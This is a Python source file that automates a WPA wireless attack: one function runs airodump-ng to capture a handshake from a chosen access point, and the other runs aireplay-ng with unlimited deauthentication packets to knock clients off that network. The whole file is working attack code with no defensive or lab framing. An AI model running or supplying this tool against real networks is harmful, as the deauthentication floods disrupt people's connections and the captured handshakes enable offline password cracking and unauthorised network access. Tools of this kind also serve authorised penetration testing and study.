import subprocess
import time
import os
import shutil

def capture_handshake(write_prefix, channel, bssid, interface, timeout=60, write_dir="."):
    """
    - Capture WPA handshake using airodump-ng.
    - Stops when handshake is detected or timeout occurs.
    - Returns the .cap file path if handshake is found, else None.
    """
    if not shutil.which("airodump-ng"):
        print("[!] airodump-ng not found in PATH")
        return None

    os.makedirs(write_dir, exist_ok=True)
    full_prefix = os.path.join(write_dir, write_prefix)
    cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "-c", str(channel),
        "-w", full_prefix,
        interface
    ]
    print("[*] Starting airodump-ng:", " ".join(cmd))
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    start = time.time()
    handshake_found = False

    try:
        while True:
            if time.time() - start > timeout:
                print("[-] Timeout waiting for handshake.")
                break
            line = process.stdout.readline()
            if not line:
                if process.poll() is not None:
                    break
                time.sleep(0.1)
                continue
            l = line.lower()
            if "wpa handshake" in l:
                handshake_found = True
                print("[+] Handshake detected.")
                break
    finally:
        try:
            if process.poll() is None:
                process.terminate()
                process.wait(timeout=3)
        except Exception:
            try:
                process.kill()
            except Exception:
                pass

    cap_file = f"{full_prefix}-01.cap"
    if handshake_found and os.path.exists(cap_file):
        print(f"[+] Capture file: {cap_file}")
        return os.path.abspath(cap_file)
    return None

def deauth_attack(bssid, interface, stop_event=None):
    """
    Launches a deauth attack using aireplay-ng.
    Runs until stop_event is set (threading.Event) or process is killed.
    """
    if not shutil.which("aireplay-ng"):
        print("[!] aireplay-ng not found in PATH")
        return

    cmd = [
        "aireplay-ng",
        "--deauth", "0",
        "-a", bssid,
        interface
    ]
    print("[*] Starting aireplay-ng:", " ".join(cmd))
    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while True:
            if stop_event and stop_event.is_set():
                break
            if process.poll() is not None:
                break
            time.sleep(1)
    finally:
        try:
            if process.poll() is None:
                process.terminate()
                process.wait(timeout=3)
        except Exception:
            try:
                process.kill()
            except Exception:
                pass
        print("[*] Aireplay-ng stopped.")


